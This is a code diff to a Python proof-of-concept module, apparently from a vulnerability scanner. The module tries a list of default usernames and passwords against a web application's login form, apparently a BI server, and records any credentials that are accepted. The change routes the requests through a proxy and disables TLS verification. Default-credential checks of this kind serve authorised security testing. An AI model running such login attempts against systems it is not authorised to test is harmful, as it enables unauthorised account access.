@@ -2,6 +2,8 @@
 # _*_ coding:utf-8 _*_
 
 import requests
+
+from Config.config_proxies import proxies
 from Config.config_requests import ua
 
 requests.packages.urllib3.disable_warnings()
@@ -28,9 +30,8 @@ def poc(target):
     for user in webapp_usernames:
         path_store = ['/public/plugin-samples', '/public/bi-developers']
         login_data = {"j_username": user, "j_password": webapp_usernames[user], "locale": "en_US"}
-        response = requests.post(url, headers=login_headers, data=login_data,verify=False,timeout=5)
+        response = requests.post(url, headers=login_headers, data=login_data,verify=False,timeout=5,proxies=proxies)
         if '/Home' in response.url:
-            print('Logging in as '+ user + ' / ' + webapp_usernames[user])
             result['target'] = target
             result['username'] = user
             result['password'] = webapp_usernames[user]
